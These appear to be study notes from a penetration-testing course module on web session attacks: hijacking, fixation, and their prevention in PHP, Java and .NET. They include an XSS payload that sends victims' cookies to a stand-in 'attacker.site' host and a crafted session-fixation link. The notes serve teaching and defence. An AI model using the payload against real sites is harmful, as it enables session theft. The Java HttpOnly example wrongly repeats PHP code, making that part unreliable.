# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
___________________________________
# Web App Security
# Module 5 - Other Common Web Attacks

https://cdn.members.elearnsecurity.com/ptp_v5/section_5/module_5/html/index.html

###### Module Map
1. Introduction
2. Session Attacks
3. CSRF
4. File and Resource Attacks

____________________________________________________
## 5.1. Introduction
Other than XSS and SQL injection, there are a number of different attack techniques against a web application. Session and logic are the most targeted elements of a web application after input.

A combination of input validation attack and flawed logic and session handling brings us more ways to break the security of a web application.

____________________________________________________
## 5.2. Session Attacks
#### 5.2.1. Weakness of the Session Identifier
Most web applications offer a login page and need to keep track of the user session. The main goal is to avoid users from logging in each time they visit the web application.
Since HTTP is a stateless protocol, web application use libraries, cookies, etc. to keep track of the user session.

The **session identifier** is a unique key that identifies a user's session within a database of sessions. It is critical to the session management mechanism because, if an attacker manages to obtain it, he can impersonate (or "ride") another user's session.

  A strong session identifier is an ID that is:
  - Valid for only a single session
  - Time limited
  - Purely random (thus unpredictable)

If you rely on language libraries (e.g. JSP, PHP, etc.), session IDs are generated according to the above rules. If you want to generate IDs manually (which should only be done by advanced users), you must pay very close attention to how you do this.

It is also very important to not store session tokens in:
- `URL`: the session token will be leaked to external sites through the referrer header and in the user browser history
- `HTML`: the session token could be cached in the browser or intermediate proxies
- `HTML5 Web Storage`:
  - **Localstorage**: will last until it is explicitly deleted, so this may make session last too long
  - **Sessionstorage**: is only destroyed when the browser is closed. There may be users that do not close their browser for a long time

The following example shows a web application that uses a weak session identifier.
These session IDs are managed directly by the web application without using any server side script library and without complying with the previous rules.

#### 5.2.2. Session Hijacking
Session Hijacking refers to the *exploitation of a valid session assigned to a user*.
The attacker can get the victim's session identifier to a user using a few different methods; through typically an XSS attack is used.
  Note that if the session identifier is weakly generated (see the previous chapter), the attacker might be able to brute-force the session ID.

The attacker's goal is to find the session identifier used by the victim. Remember that in most web applications, session IDs are typically carried back and forth between client web browser and server by using:
- Cookies
- URLs

For the sake of simplicity, in the following examples we will discuss session IDs carried by cookie headers.

This is currently the most common method employed by web developers.

#### 5.2.3. Session Hijacking Attacks
A Session Hijack attack can happen by:
- Exploiting an existing XSS vulnerability (most common)
- Packet sniffing
- Gaining direct access to server filesystem where sessions are stored
- Finding session IDs in logs or browser history (sessions carried through the URL)

###### 5.2.3.1. Exploit Session Hijacking via XSS
One of the most common methods used to mount a session hijacking attack is to exploit an XSS vulnerability in the web application.

Of course, Session Hijacking is only **one** of the many possibilities of a successful XSS exploit.

You can perform this attack when all the following conditions occur;
- An XSS vulnerability exists and you can execute your own payload through it
- Session ID is sent through cookies on each HTTP request (this was an assumption)
- Cookies are readable by JavaScript

Let us briefly see how we can perform Session Hijacking by exploiting an XSS flaw. We will explain the whole process in the next video.

For now, let's suppose that we have found a XSS vulnerability on the following target web application: `elsfooradio.site`
  The application does not properly sanitize the input in the comment field. So the attacker can insert the malicious payload here (in the comment section and title) (see img-19)

  Once the payload (comment) is added, the following popup will appear. The attacker can then create a more sophisticated payload in order to steal the cookie of the user that visits the page. You can use a payload to the one used in the XSS module.

  By using the following script, we will be able to steal the users cookies. Once we collect them, we just need to change our current cookies, refresh our browser, and we will navigate the web application with the victim session.
    ```
    <script>
      var i=new Image();
      i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;
    </script>
    ```

###### 5.2.3.2. Preventing Session Hijacking via XSS
Please note that the cookie content needs to be accessible by JavaScript for the above attack to be successful.

Prevention:
  In order to prevent cookie stealing through XSS, making cookies inaccessible via JavaScript is necessary. **This is as simple as creating the cookie with the "HTTPONLY" flag enabled.**

If you are using server-side script libraries to manage sessions, you cannot manage the cookies directly because the script engine offers only a simple interface.

Let's see how you could use it.

**PHP**
  Before any session-related operation is performed, you should run the following instruction:
    ```
    ini_set('session.cookie_httponly','1')
    ```

  When `session_start()` is invokes, if a valid session does not already exist, a new one will be created. A cookie with the name **PHPSESSID** and **HttpOnly** flag enabled will be sent to the web client.

**Java**
  Servlet 3.0 (Java EE 6) introduced a standard way to configure **HttpOnly** attribute for the session cookie; this can be accomplished by applying the following configuration in `web.xml`.
    ```
    ini_set('session.cookie_httponly','1');
    ```

  In Tomcat 6, the flag **useHttpOnly=True** in `context.xml` forces this behavior for applications, including Tomcat-based frameworks like **JBoss**.

  If you want to manage sessions cookies directly, you can do so from the Java cookie interface.

  *Sun JavaEE* supports the **HTTPOnly** flag in the cookie interface and for session cookies (JSESSIONID), after version 6 (Servlet class V3).
    ```
    String sessionid = request.getSessoin().getId();
    response.setHeader("SET-COOKIE", "JSESSIONID=" + sessionid + ";HttpOnly");
    ```
    The methods **setHttpOnly** and **isHttpOnly** can be used to set and check for **HttpOnly** value in cookies. For older versions, the workaround is to rewrite the JSESSIONID value, setting it as a custom header (more info [here](https://www.owasp.org/index.php/HttpOnly)).

**.NET**
  By default, starting from **.NET 2.0**, the framework sets the **HttpOnly** attribute for both:
  - SessionIDs
  - Forms Authentication cookie

  Although session hijacking via XSS is very common, there are other methods an attacker can use such as: **packet sniffing**
  This type of attack requires the attacker to be able to sniff the HTTP traffic of the victim. This is unlikely to happen for a remote attacker but, it is feasible on a local network if both the attacker and victim are present.

    If HTTP traffic is encrypted through IPSEC or SSL, the session token will be harder (if not impossible) to obtain.

  This attack requires the following 2 conditions to be true:
  - Victim HTTP traffic can be sniffed (LAN or compromised gateway)
  - HTTP traffic must be unencrypted (No SSL)

  The goal of the attack is always the same: stealing the victim's session identifier. The attacker analyzes sniffed traffic and retrieves the victim's session identifier.

###### 5.2.3.4. Session Hijacking via Access to the Web Server
Generally speaking, session data is stored in either the web server file's system or in memory. If an attacker obtains full access to the web server, the malicious user can steal the session data of all users - not just the session identifiers.

Since having access to the server is not a vector we are interested in at this time (the attacker would have many other methods to perform more malicious activities than just stealing sessions), we will just tell you where the session data is stored on a server.

**PHP**
  Session data will be stored within the folder specified by the `php.ini` entry `session.save_path`. The attacker will focus on files named `sess_<sesionID>`.

  In a real world example, we could find the following entries:
  - *sess_ta9i1kqska407387itjf1576324*
  - *sess_7o410kk5bt14el4q1ok8r26tn12*

  If you want to hijack the user session related to the first entry, you would install a new cookie in your web browser using these values:
  - `cookie name: PHPSESSID`
  - `cookie value: ta9i1kqska407387itjf1576324`

  The attack is very simple however, it is critical that the attacker has access to the webserver file system.

**Java**
  Tomcat provides two standard implementations of a Session Manager.
  The default one stores active sessions, while the second stores active sessions have been swapped. The file name of the default session data file is `SESSIONS.ser`.

  You can find more information [here](http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html)

**.NET**
  ASP.NET can store sessions data in three different locations:
    - ASP.NET runtime process `aspnet_wp.exe`
      If the web server crashes then all sessions data will be lost
    - A dedicated Windows Service
      If the web server crashes then session data will persist but if the machine crashes then the session data will be lost.
    - Microsoft SQL Server data
      Session data will persist regardless of crashes

  Unlike PHP technology, .NET session data cannot be read directly from files on web servers.

#### 5.2.4. Session Fixation Attack
Session fixation is a session hijacking attack where, as the name suggests, the attacker fixates a **sessionID** and forces the victim to use it (after the user logs in). The attack can be divided into two phases:
1. The attacker obtains a valid **sessionID**
2. The attacker forces the victim to use this **sessionID** to establish a personal session with web server

In contrast to the previous attack, the attacker is not interested in stealing the **sessionID**; he instead creates one and forces the victim to use it. (see img-39)

###### 5.2.4.1. Step 1 : Set the sessionID
You may think that the attacker owns a valid **sessionID** only when he is already authenticated to the vulnerable site.

This is not always true; most web applications are designed to start a new session for the first time a user visits a website regardless of whether or not they are authenticated.

Although this is not a vulnerability, it could turn into **Session Fixation** if:
- the session identifier remains the same after a successfully reserved operation (for example login)
- the session identifier can be propagated (for example via URL or JavaScript)

Some web applications could permit the attacker to create and use his own personal sessionID; in this case, you do not care about obtaining a valid sessionID because you can simply create one!

If a web application releases a valid sessionID only after a reserved operation (for example, a login), **Session Fixation** is only possible if the attacker is also a member of the vulnerable website.

In this case, the attacker can use **Session Fixation** to impersonate other user.

###### 5.2.4.2. Step 2 : Force the Victim
This happens when the **sessionID** is embedded in the URL rather than the cookie header; an attacker can simply send a malicious link to the victim, which will set  the new and known **sessionID**.
A web application vulnerable to **Session Fixation** will recycle this **sessionID** and will bind the session to the victim.

###### 5.2.4.3. Vulnerable Web Application
Let's see what would happen with a vulnerable application that does not refresh the **sessionID** after the user logs in and also propagates the users sessionID via URL. In the following screenshot we can see that the sessionID is set in the parameter `SID` within the `login.php` page (see img-45)

Knowing that, the attacker creates the following link and sends it to the victim:
  ```
  http://sessionfixation.site/login/php?SID=300
  ```

Once the victim opens the link, the sessionID will be set to `300`. Since the Web Application recycles the sessionID (even after the user logs in), the attacker is able to impersonate the victim session by changing his sessionID to `300`.


#### 5.2.5. Preventing Session Fixation
Theoretically, the bests technique to defend your application from Session Fixation attacks is to generate a new **sessionID** after any authenticated operation is performed.

Most of the time however, it is sufficient to destroy and regenerate a new session upon successful login.
Server-side scripting language provide different libraries and built-in functions to manage sessions.

Let's take a look at them.

**PHP**
  The following method will replace the current **sessionID** with a new one and will retain the current session information.
  The old session cookie will be automatically invalidated and a new one will be sent
      ```
      session_regenerate_id(true);
      ```
  You can find more information [here](http://php.net/manual/en/function.session-regenerate-id.php)

**Java**
  In Java, methods for performing the invalidation of the current session and the creation of a new one does not exist, therefore, you should use the following instruction set:
    ```
    oldHTTPSession=HttpServletRequest.getSession();
    oldHTTPSession.invalidate();
    newHttpSession=HttpServletRequest.getSession(true);
    ```

  The old session cookie will be automatically invalidated and a new one will be sent.
  You can find more information [here](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html)

**.NET**
  Preventing Session Fixation in .NET is more complicated because of the tricky API. The .NET framework provides the `HttpSessionState.Abandon()` method to manage session removal.

  In this method, .NET documentation states that: *once the Abandon method is called, the current session is no longer valid and a new session can be started*

  Although the session is invalidated, the web application will continue using the same **sessionID** within the cookie header, so Session Fixation could still occur. To solve this issue, Microsoft suggests you to explicitly invalidate the cookie session:
    *When you abandon a session, the sessionID cookie is not removed from the browser of the user. Therefore, as soon as the session has been abandoned, any new requests to the same application will use the same sessionID but will have a new session state stance*

  So the correct code would be:
    ```
    Session.Abandon();
    Response.Cookie.Add(new HttpCookie("ASP.NET_SessionID", ""));
    ```

  You can find more information [here][https://msdn.microsoft.com/en-us/library/ms524310(v=vs.90).aspx].


(see vid-54)
____________________________________________________
## 5.3. CSRF


____________________________________________________
## 4.4. File and Resource Attacks
